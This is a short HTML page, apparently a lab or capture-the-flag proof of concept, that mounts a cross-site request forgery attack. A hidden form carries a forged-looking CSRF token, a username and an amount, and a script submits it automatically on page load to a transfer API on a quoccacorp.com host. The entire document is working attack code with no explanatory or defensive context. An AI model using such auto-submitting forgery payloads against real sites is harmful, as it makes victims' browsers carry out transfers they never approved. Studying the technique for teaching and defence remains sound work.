<!DOCTYPE html>
<html>
  <body>

    <form id="csrf" action="https://phish-me.quoccacorp.com/api/transfer" method="POST">
      <input type="hidden" name="csrf_token" value="OTQ5Nw==">
      <input type="hidden" name="username"   value="z5520080">
      <input type="hidden" name="amount"     value="5">
    </form>
    <script>
      document.getElementById('csrf').submit();
    </script>
  </body>
</html>
